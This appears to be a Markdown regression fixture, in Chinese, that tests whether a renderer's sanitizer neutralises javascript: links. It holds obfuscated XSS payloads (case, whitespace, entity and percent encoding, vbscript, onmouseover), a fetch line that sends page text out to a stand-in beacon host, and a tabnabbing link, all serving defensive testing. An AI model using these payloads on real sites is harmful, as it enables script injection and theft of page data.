# XSS 样本 04：HTML 链接的 javascript: 协议

**攻击手法**：`<a href="javascript:...">` 是需要用户点击才触发的存储型 XSS。它的危险在于：很多消毒器只过滤事件属性而放行 `href`，且 `javascript:` 协议可以用大小写、HTML 实体、制表符/换行符、`&colon;` 等多种方式混淆。Lute 历史上就出过 href 注入的 CVE（CVE-2026-25647），本样本是该 CVE 的固定回归用例。

**预期：脚本不执行、无外网请求。**（本样本需**逐个点击**每条链接才算验完）

**验证方法**：打开本文件 → 逐条点击下方链接 → 无弹窗、Console 无 `XSS-04` 输出 → 不得用系统默认浏览器打开任何 `javascript:` 地址 → Elements 面板中这些 `href` 应被替换为无害值（如 `#` 或被整体移除）。

---

## payload 1：基础形态

<a href="javascript:alert('XSS-04-A')">点我-A（基础）</a>

## payload 2：大小写混淆

<a href="JaVaScRiPt:alert('XSS-04-B')">点我-B（大小写）</a>

<a href="JAVASCRIPT:alert('XSS-04-C')">点我-C（全大写）</a>

## payload 3：协议前后插入空白（空格 / 制表符 / 换行）

<a href="  javascript:alert('XSS-04-D')">点我-D（前置空格）</a>

<a href="jav	ascript:alert('XSS-04-E')">点我-E（协议中插制表符）</a>

<a href="jav
ascript:alert('XSS-04-F')">点我-F（协议中插换行）</a>

## payload 4：实体编码的冒号与字母

<a href="javascript&colon;alert('XSS-04-G')">点我-G（&amp;colon;）</a>

<a href="java&#115;cript:alert('XSS-04-H')">点我-H（&amp;#115; = s）</a>

## payload 5：百分号编码

<a href="java%73cript:alert('XSS-04-I')">点我-I（%73 = s）</a>

## payload 6：vbscript 与其他可执行协议

<a href="vbscript:msgbox('XSS-04-J')">点我-J（vbscript）</a>

<a href="livescript:alert('XSS-04-K')">点我-K（livescript）</a>

## payload 7：不点也危险的变体（结合事件属性）

<a href="javascript:alert('XSS-04-L')" onmouseover="alert('XSS-04-M')">悬停即触发-M</a>

## payload 8：外带数据

<a href="javascript:fetch('https://xss-beacon.example.invalid/04-n?d='+encodeURIComponent(document.body.innerText.slice(0,200)))">点我-N（外带正文）</a>

## payload 9：target=_blank + 反向 tabnabbing

<a href="https://xss-beacon.example.invalid/04-o.html" target="_blank">点我-O（新窗口）</a>

预期：外链应交由**系统默认浏览器**打开，且渲染产物中必须带 `rel="noopener noreferrer"`，绝不能在应用内 WebView 中导航。

---

## 对照组（良性链接必须保留可点击）

- <a href="https://v2.tauri.app/">HTML 写法的良性外链</a>
- <a href="../full-gfm.md">HTML 写法的相对 .md 链接</a>
- <a href="#对照组良性链接必须保留可点击">HTML 写法的文内锚点</a>
- <a href="mailto:noreply@example.invalid">邮件链接</a>

> **判定口径**：payload 全部无效（点击无反应或跳到无害地址）+ 对照组四条仍可正常使用 = 通过。
> **额外检查**：应用窗口本身的地址不得发生任何导航（`location.href` 保持不变）——一旦主窗口被导航走，即使脚本没执行也是严重缺陷。
